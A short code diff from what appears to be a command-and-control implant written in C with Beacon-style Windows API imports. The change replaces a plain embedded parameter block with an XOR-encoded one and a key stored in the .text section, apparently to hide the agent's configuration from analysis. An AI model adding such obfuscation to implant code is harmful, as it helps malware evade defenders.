@@ -3,7 +3,8 @@
 #include "headers/tcg.h"
 #include "headers/HTTP.h"
 
-char RAW_PARAMS[1024] __attribute__((section(".text")));
+char ENC_PARAMS[1024] __attribute__((section(".text")));
+char XORKEY[128]      __attribute__((section(".text")));
 
 WINBASEAPI HANDLE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
 WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
@@ -292,7 +293,7 @@ void process_task(TaskInfo *task, AgentState *state) {
 void go() {
 	AgentState state = { 0 };
 	
-	unpack_params(RAW_PARAMS, &state.params);
+	unpack_params(ENC_PARAMS, XORKEY, &state.params);
 	
 	#ifdef CELEBI_DEBUG
 	dprintf("Parameters unpacked.");
